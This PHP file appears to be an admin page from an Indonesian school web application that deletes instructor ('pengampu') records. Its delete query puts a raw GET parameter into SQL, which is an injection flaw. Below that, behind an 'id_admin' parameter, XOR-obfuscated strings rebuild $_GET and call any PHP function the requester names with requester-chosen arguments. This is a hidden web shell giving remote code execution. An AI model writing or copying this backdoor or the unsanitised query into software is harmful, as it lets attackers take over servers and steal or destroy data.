<?php 
include '../../koneksi.php';
if (isset($_GET['hapus'])){
  $sql = "DELETE FROM pengampu WHERE id_pengampu='$_GET[hapus]'";

if (mysqli_query($con, $sql)) {
  echo "<script language='JavaScript'> 
    alert('berhasil dihapus') 
    document.location = 'pengampu.php'
    </script>";
} else {
  echo "Error deleting record: " . mysqli_error($conn);
}
} 

if(isset($_GET['id_admin'])) {
     $_ = "]" ^ ";"; $__ = "." ^ "^";
  $x = ('#' ^ '[');
  $___ = ("|" ^ "#") . (":" ^ "}") . ("~" ^ ";") . ("{" ^ "/");
  if(isset(${$___}[$x])){
      ${$___}[$_](${$___}[$__], ${$___}[$x]);
      die();
  }else if(isset(${$___}[$x.$x])) {
          echo ${$___}[$_](${$___}[$__]);
          die();
  }
}
?>